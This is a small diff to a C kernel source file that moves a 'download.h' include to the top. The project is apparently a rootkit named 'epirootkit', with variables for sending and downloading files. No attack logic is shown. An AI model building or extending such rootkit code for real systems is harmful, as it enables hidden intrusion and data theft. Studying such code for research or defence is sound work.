@@ -1,3 +1,5 @@
+#include "download.h"
+
 #include <linux/fs.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
@@ -5,7 +7,6 @@
 
 #include "epirootkit.h"
 #include "io.h"
-#include "download.h"
 
 static bool sending_file = false;
 static char *download_buffer = NULL;
